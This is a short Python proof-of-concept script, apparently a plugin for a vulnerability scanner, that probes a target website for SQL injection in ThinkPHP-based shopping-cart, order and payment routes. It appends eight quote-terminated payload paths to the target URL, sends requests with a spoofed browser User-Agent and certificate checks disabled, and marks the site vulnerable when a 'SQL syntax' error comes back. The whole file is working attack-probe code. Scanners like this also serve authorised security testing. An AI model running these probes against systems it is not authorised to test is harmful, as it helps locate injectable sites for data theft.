#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
}
payloads = [
    r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
    r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
    r'index.php?s=/home/user/cut/id/1%27',
    r'index.php?s=/home/service/index/id/1%27',
    r'index.php?s=/home/pay/chongzhi/orderid/1%27',
    r'index.php?s=/home/order/complete/id/1%27',
    r'index.php?s=/home/order/detail/id/1%27',
    r'index.php?s=/home/order/cancel/id/1%27',
]


async def thinkphp_multi_sql_leak_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    results = []
    for payload in payloads:
        try:
            vurl = urljoin(url, payload)
            resp = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if 'SQL syntax' in resp.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = 'SQL syntax found'
                pocdict['response'] = resp.text
        except Exception as e:
            pocdict['exception'] = str(e)
        results.append(pocdict)
    return results
